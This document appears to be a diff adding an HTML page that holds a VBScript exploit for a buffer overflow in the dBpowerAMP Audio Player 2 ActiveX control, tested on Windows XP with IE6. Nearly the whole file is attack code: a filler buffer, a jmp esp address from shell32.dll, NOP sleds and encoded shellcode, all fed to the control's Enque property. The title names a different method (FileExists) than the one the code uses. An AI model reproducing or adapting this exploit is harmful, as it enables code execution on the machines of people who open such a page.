@@ -1,0 +1,57 @@
+<html>
+
+<OBJECT id=target classid=clsid:BECB8EE1-6BBB-4A85-8DFD-099B7A60903A></OBJECT>
+
+<SCRIPT language=vbscript>
+
+' Exploit Title: dBpowerAMP Audio Player 2 FileExists ActiveX Buffer Overflow 
+
+' Author: Hadji Samir ,s-dz@hotmail.fr
+ 
+' Tested on: Windows XP SP2 FR / IE6
+ 
+' Down : http://www.dbpoweramp.com/bin/dBpowerAMP-r2.exe
+ 
+
+buffer=String(352, "A")
+
+jmp=unescape("%65%82%A6%7C") 'jmp esp from shell32.dll 0x7CA68265
+
+
+
+buffer=String(352, "A")
+
+nops = string(12, unescape("%90"))
+
+shellcode=unescape("%eb%03%59%eb%05%e8%f8%ff%ff%ff%4f%49%49%49%49%49%49%51%5a%56%54%58%36%33%30%56%58%34%41%30%42%36") 
+
+shellcode=shellcode+unescape("%48%48%30%42%33%30%42%43%56%58%32%42%44%42%48%34%41%32%41%44%30%41%44%54%42%44%51%42%30%41%44%41") 
+
+shellcode=shellcode+unescape("%56%58%34%5a%38%42%44%4a%4f%4d%4e%4f%4a%4e%46%34%42%30%42%30%42%50%4b%48%45%34%4e%53%4b%48%4e%47") 
+
+shellcode=shellcode+unescape("%45%30%4a%57%41%30%4f%4e%4b%58%4f%34%4a%31%4b%58%4f%35%42%42%41%30%4b%4e%49%54%4b%38%46%33%4b%38") 
+
+shellcode=shellcode+unescape("%41%30%50%4e%41%43%42%4c%49%49%4e%4a%46%38%42%4c%46%37%47%30%41%4c%4c%4c%4d%30%41%50%44%4c%4b%4e") 
+
+shellcode=shellcode+unescape("%46%4f%4b%43%46%35%46%42%46%50%45%47%45%4e%4b%58%4f%45%46%32%41%50%4b%4e%48%36%4b%38%4e%50%4b%54") 
+
+shellcode=shellcode+unescape("%4b%38%4f%35%4e%31%41%30%4b%4e%4b%58%4e%31%4b%38%41%30%4b%4e%49%38%4e%35%46%52%46%50%43%4c%41%33") 
+
+shellcode=shellcode+unescape("%42%4c%46%36%4b%48%42%44%42%53%45%58%42%4c%4a%37%4e%50%4b%38%42%44%4e%50%4b%48%42%47%4e%41%4d%4a") 
+
+shellcode=shellcode+unescape("%4b%48%4a%36%4a%30%4b%4e%49%30%4b%48%42%38%42%4b%42%50%42%50%42%50%4b%38%4a%46%4e%43%4f%35%41%43") 
+
+shellcode=shellcode+unescape("%48%4f%42%46%48%45%49%48%4a%4f%43%48%42%4c%4b%57%42%55%4a%56%42%4f%4c%38%46%50%4f%45%4a%36%4a%49") 
+
+shellcode=shellcode+unescape("%50%4f%4c%48%50%50%47%55%4f%4f%47%4e%43%36%41%56%4e%56%43%56%42%30%5a") 
+
+nops1 = string(100, unescape("%90"))
+
+
+
+arg1 = buffer + jmp + nops + shellcode + nops1 
+
+target.Enque = arg1
+
+</SCRIPT>
+</HTML>
